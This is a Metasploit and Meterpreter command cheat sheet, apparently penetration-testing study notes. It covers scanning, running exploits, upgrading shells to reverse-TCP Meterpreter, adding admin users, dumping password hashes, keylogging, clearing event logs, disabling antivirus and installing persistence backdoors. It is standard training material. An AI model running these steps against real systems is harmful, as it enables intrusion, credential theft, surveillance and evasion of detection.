# MSF Console
### References:
https://metasploit.help.rapid7.com/docs/msf-overview
https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/

## Keywords:
RHOST - this is the remote host or target IP
RPORT - this is the remote port or target port
LHOST - this is the local/listening host or attacker IP
LPORT - this is the local/listening port or attacker port


### Start the postgresql database before starting Metasploit
```
service postgresql start
```
### if this is the first time you are running metasploit, run the following:
```
service postgresql start
msfdb init
```

### start metasploit using msfconsole
```
msfconsole
```

### check Database status
```
db_status
```

### get all the gems with bundle install
```
bundle install
```

### add a workspace
```
workspace -a db-name
```

### check existing workspaces
```
workspace
```

### simple nmap scan in msfconsole
```
db_nmap -v -sV host_or_network_to_scan[eg 192.168.0.0/24]
```

### To list all the remote hosts found by your nmap scan
```
hosts
```

### to list all the services discovered in the scan
```
services
```

### To add these hosts to your list of remote targets
```
hosts -R
```

### Pick a vulnerability and use an exploit
```
search type:exploit
search type:exploit platform:windows flash
search CVE-XXXX-XXXX
search cve:2014
search name:wordpress
```

### Metasploit has six (6) types of modules
```
exploits
payloads
auxiliary
nops 
post
encoders
```

### select exploit
```
use exploit/path/to/exploit_name
```

### show available payloads
```
show payloads
```

### show available targets
```
show targets
```

### show available options
```
show options
```
### show info
```
info
```
### execute the exploit 2 options
```
run
exploit
```

### execute the exploit in the back ground 2 options
```
run -j
exploit -j 
```

### view backgrounded sessions
```
sessions -l
```

### make background session foreground
```
sessions -i <session #>
```

### Upgrading shells to Meterpreter
https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html#:~:text=If%20you%20have%20an%20existing%20session%2C%20either%20Meterpreter%2C,-u%20-1%20Or%20run%20the%20shell_to_meterpreter%20module%20manually%3A

If you have an existing session, either Meterpreter, an SSH, or a basic command shell - you can open a new Meterpreter session with:
```
sessions -u 3
```
To upgrade the most recently opened session to Meterpreter using the sessions command:
```
sessions -u -1
```
Or run the shell_to_meterpreter module manually:
```
use multi/manage/shell_to_meterpreter
run session=-1
run session=-1 win_transfer=POWERSHELL
run session=-1 win_transfer=VBS
```
If you want to upgrade your shell with fine control over what payload, use the PAYLOAD_OVERRIDE, PLATFORM_OVERRIDE, and on windows, PSH_ARCH_OVERRIDE. All 3 options are required to set an override on windows, and the first two options are required on other platforms, unless you are not using an override.
```
use multi/manage/shell_to_meterpreter
set SESSION 1
set PAYLOAD_OVERRIDE windows/meterpreter/reverse_tcp
set PLATFORM_OVERRIDE windows
set PSH_ARCH_OVERRIDE x64
```

### rebuild the database caches if needed
```
db_rebuild_cache
```

### go back or exit module without leaving msfconsole
```
back
```

### exit msfconsole
```
exit
```

### Metasploit Netcat module
```
connect -h
connect <ip address> <port>
```

### Module Information
```
info <path/to/the/modeule>
```

### Live Ruby Interpteter
```
irb
```

### jobs are modules that are running in the background
```
jobs -l 	# list all running jobs
jobs -K		# kill all running jobs
```
### set global variable
```
setg 
setg RHOSTS <ip address>
```

### searching for MS SQL on a server
```
search mssql
use auxiliary/scanner/mssql/mssql_ping
show options
set RHOSTS <ip range>
exploit
```

### use results to determine who to attack
```
use auxiliary/admin/mssql/mssql_exec
show options
set RHOST <ip address>
set MSSQL_PASS <password>
```

### set CMD to add user to MS system
```
set CMD net user <username> <password> /ADD
exploit
```

### CMD to add new user to the administrators account
```
net localgroup administratos <username> /ADD
```

### Password sniffer
```
use auxiliary/sniffer/psnuffle
show options
```

# Meterpreter
### Privilege Escalation
### load priv extension
```
use priv
```
### run automated privilege escalation
```
getsystem
```
### check user
```
getuid
```
### if getsystem fails
### background the job
```
background
```
### list exploits available
```
use exploit/windows/local/
show options
exploit
```


## Core Commands:

At its most basic use, meterpreter is a Linux terminal on the victim's computer. As such, many of our basic Linux commands can be used on the meterpreter even if it's on a Windows or other operating system. Here are some of the core commands we can use on the meterpreter:
```
?               help menu
background      moves the current session to the background
bgkill          kills a background meterpreter script
bglist          provides a list of all running background scripts
bgrun           runs a script as a background thread
channel         displays active channels
close           closes a channel
exit            terminates a meterpreter session
exploit         executes the meterpreter script designated after it
help            help menu
interact        interacts with a channel
irb             go into Ruby scripting mode
migrate         moves the active process to a designated PID
quit            terminates the meterpreter session
read            reads the data from a channel
run             executes the meterpreter script designated after it
use             loads a meterpreter extension
write           writes data to a channel
```

## File System Commands:
```
cat             read and output to stdout the contents of a file
cd              change directory on the victim
del             delete a file on the victim
download        download a file from the victim system to the attacker system
edit            edit a file with vim
getlwd          print the local directory
getwd           print working directory
lcd             change local directory
lpwd            print local directory
ls              list files in current directory
mkdir           make a directory on the victim system
pwd             print working directory
rm              delete (remove) a file
rmdir           remove directory on the victim system
upload          upload a file from the attacker system to the victim
```

## Networking Commands:
```
ipconfig        displays network interfaces with key information including IP address, etc.
portfwd         forwards a port on the victim system to a remote service
route           view or modify the victim routing table
```
## Examples:
### Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
```
portfwd add –l 3389 –p 3389 –r target-host
```

### Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
```
portfwd delete –l 3389 –p 3389 –r target-host
```

### Meterpreter delete all port forwards
```
portfwd flush
```
### Meterpreter list active port forwards
```
portfwd list
```
### Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0
```
run autoroute -s 192.168.15.0/24
```
### Meterpreter list all active routes
```
run autoroute -p
```
### Meterpreter view available networks the compromised host can access
```
route
```
### Meterpreter add route for 192.168.14.0/24 via Session 3.
```
route add 192.168.14.0 255.255.255.0 3
```
### Meterpreter delete route for 192.168.14.0/24 via Session 3.
```
route delete 192.168.14.0 255.255.255.0 3
```
### Meterpreter delete all routes
```
route flush
```

## System Commands:
```
clearev         clears the event logs on the victim's computer
drop_token      drops a stolen token
execute         executes a command
getpid          gets the current process ID (PID)
getprivs        gets as many privileges as possible
getuid          get the user that the server is running as
kill            terminate the process designated by the PID
ps              list running processes
reboot          reboots the victim computer
reg             interact with the victim's registry
rev2self        calls RevertToSelf() on the victim machine
shell           opens a command shell on the victim machine
shutdown        shuts down the victim's computer
steal_token     attempts to steal the token of a specified (PID) process
sysinfo         gets the details about the victim computer such as OS and name
```

## User Interface Commands:
```
enumdesktops    lists all accessible desktops
getdesktop      get the current meterpreter desktop
idletime        checks to see how long since the victim system has been idle
keyscan_dump    dumps the contents of the software keylogger
keyscan_start   starts the software keylogger when associated with a process such as Word or browser
keyscan_stop    stops the software keylogger
screenshot      grabs a screenshot of the meterpreter desktop
set_desktop     changes the meterpreter desktop
uictl           enables control of some of the user interface components
```

## Privilege Escalation Commands:
```
getsystem       uses 15 built-in methods to gain sysadmin privileges
```

## Password Dump Commands:
hashdump grabs the hashes in the password (SAM) file
Note that hashdump will often trip AV software, but there are now two scripts that are more stealthy, run hashdump and run smart_hashdump. Look for more on those in my meterpreter script cheat sheet.

## Timestomp Commands:
timestomp       manipulates the modify, access, and create attributes of a file



### loadable libraries:
```
meterpreter> use <library>

Permits loading extra meterpreter functionalities with the following

espia		Allows Desktop spying through screenshots
incognito	Allows user impersonation sort of commands
priv		Allows filesystem and hash dumping commands
sniffer		Allows network sniffing interaction commands
```

### Script Commands with Brief Descriptions:
meterpreter> irb - Opens meterpreter scripting menu

```
meterpreter> run <script>
```

### Scripts:
```
arp_scanner.rb - Script for performing an ARP's Scan Discovery.
autoroute.rb - Meterpreter session without having to background the current session.
checkvm.rb - Script for detecting if target host is a virtual machine.
credcollect.rb - Script to harvest credentials found on the host and store them in the database.
domain_list_gen.rb - Script for extracting domain admin account list for use.
dumplinks.rb - Dumplinks parses .lnk files from a user's recent documents folder and Microsoft Office's Recent documents folder, if present. The .lnk files contain time stamps, file locations, including share names, volume serial #s and more. This info may help you target additional systems.
duplicate.rb - Uses a meterpreter session to spawn a new meterpreter session in a different process. A new process allows the session to take "risky" actions that might get the process killed by A/V, giving a meterpreter session to another controller, or start a keylogger on another process.
enum_chrome.rb - Script to extract data from a chrome installation.
enum_firefox.rb - Script for extracting data from Firefox. enum_logged_on_users.rb - Script for enumerating current logged users and users that have logged in to the system. enum_powershell_env.rb - Enumerates PowerShell and WSH configurations.
enum_putty.rb - Enumerates Putty connections.
enum_shares.rb - Script for Enumerating shares offered and history of mounted shares.
enum_vmware.rb - Enumerates VMware configurations for VMware products.
event_manager.rb - Show information about Event Logs on the target system and their configuration.
file_collector.rb - Script for searching and downloading files that match a specific pattern.
get_application_list.rb - Script for extracting a list of installed applications and their version.
getcountermeasure.rb - Script for detecting AV, HIPS, Third Party Firewalls, DEP Configuration and Windows Firewall configuration. Provides also the option to kill the processes of detected products and disable the built-in firewall.
get_env.rb - Script for extracting a list of all System and User environment variables.
getfilezillacreds.rb - Script for extracting servers and credentials from Filezilla.
getgui.rb - Script to enable Windows RDP.
get_local_subnets.rb - Get a list of local subnets based on the host's routes.
get_pidgen_creds.rb - Script for extracting configured services with username and passwords.
gettelnet.rb - Checks to see whether telnet is installed.
get_valid_community.rb - Gets a valid community string from SNMP.
getvncpw.rb - Gets the VNC password.
hashdump.rb - Grabs password hashes from the SAM.
hostedit.rb - Script for adding entries in to the Windows Hosts file.
keylogrecorder.rb - Script for running keylogger and saving all the keystrokes.
killav.rb - Terminates nearly every antivirus software on victim.
metsvc.rb - Delete one meterpreter service and start another.
migrate - Moves the meterpreter service to another process.
multicommand.rb - Script for running multiple commands on Windows 2003, Windows Vistaand Windows XP and Windows 2008 targets.
multi_console_command.rb - Script for running multiple console commands on a meterpreter session.
multi_meter_inject.rb - Script for injecting a reverce tcp Meterpreter Payload into memory of multiple PIDs, if none is provided a notepad process will be created and a Meterpreter Payload will be injected in to each.
multiscript.rb - Script for running multiple scripts on a Meterpreter session.
netenum.rb - Script for ping sweeps on Windows 2003, Windows Vista, Windows 2008 and Windows XP targets using native Windows commands.
packetrecorder.rb - Script for capturing packets in to a PCAP file.
panda2007pavsrv51.rb - This module exploits a privilege escalation vulnerability in Panda Antivirus 2007. Due to insecure permission issues, a local attacker can gain elevated privileges.
persistence.rb - Script for creating a persistent backdoor on a target host.
pml_driver_config.rb - Exploits a privilege escalation vulnerability in Hewlett-Packard's PML Driver HPZ12. Due to an insecure SERVICE_CHANGE_CONFIG DACL permission, a local attacker can gain elevated privileges.
powerdump.rb - Meterpreter script for utilizing purely PowerShell to extract username and password hashes through registry keys. This script requires you to be running as system in order to work properly. This has currently been tested on Server 2008 and Windows 7, which installs PowerShell by default.
prefetchtool.rb - Script for extracting information from windows prefetch folder.
process_memdump.rb - Script is based on the paper Neurosurgery With Meterpreter.
remotewinenum.rb - This script will enumerate windows hosts in the target environment given a username and password or using the credential under which Meterpeter is running using WMI wmic windows native tool.
scheduleme.rb - Script for automating the most common scheduling tasks during a pentest. This script works with Windows XP, Windows 2003, Windows Vista and Windows 2008.
schelevator.rb - Exploit for Windows Vista/7/2008 Task Scheduler 2.0 Privilege Escalation. This script exploits the Task Scheduler 2.0 XML 0day exploited by Stuxnet.
schtasksabuse.rb - Meterpreter script for abusing the scheduler service in Windows by scheduling and running a list of command against one or more targets. Using schtasks command to run them as system. This script works with Windows XP, Windows 2003, Windows Vista and Windows 2008.
scraper.rb - The goal of this script is to obtain system information from a victim through an existing Meterpreter session.
screenspy.rb - This script will open an interactive view of remote hosts. You will need Firefox installed on your machine.
screen_unlock.rb - Script to unlock a windows screen. Needs system privileges to run and known signatures for the target system.
screen_dwld.rb - Script that recursively search and download files matching a given pattern.
service_manager.rb - Script for managing Windows services.
service_permissions_escalate.rb This script attempts to create a service, then searches through a list of existing services to look for insecure file or configuration permissions that will let it replace the executable with a payload. It will then attempt to restart the replaced service to run the payload. If that fails, the next time the service is started (such as on reboot) the attacker will gain elevated privileges.
sound_recorder.rb - Script for recording in intervals the sound capture by a target host microphone.
srt_webdrive_priv.rb - Exploits a privilege escalation vulnerability in South River Technologies WebDrive.
uploadexec.rb - Script to upload executable file to host.
virtualbox_sysenter_dos - Script to DoS Virtual Box.
virusscan_bypass.rb - Script that kills Mcafee VirusScan Enterprise v8.7.0i+ processes.
vnc.rb - Meterpreter script for obtaining a quick VNC session.
webcam.rb - Script to enable and capture images from the host webcam.
win32-sshclient.rb - Script to deploy & run the "plink" commandline ssh-client. Supports only MS-Windows-2k/XP/Vista Hosts.
win32-sshserver.rb - Script to deploy and run OpenSSH on the target machine.
winbf.rb - Function for checking the password policy of current system. This policy may resemble the policy of other servers in the target environment.
winenum.rb - Enumerates Windows system including environment variables, network interfaces, routing, user accounts, etc
wmic.rb - Script for running WMIC commands on Windows 2003, Windows Vista and Windows XP and Windows 2008 targets.
```
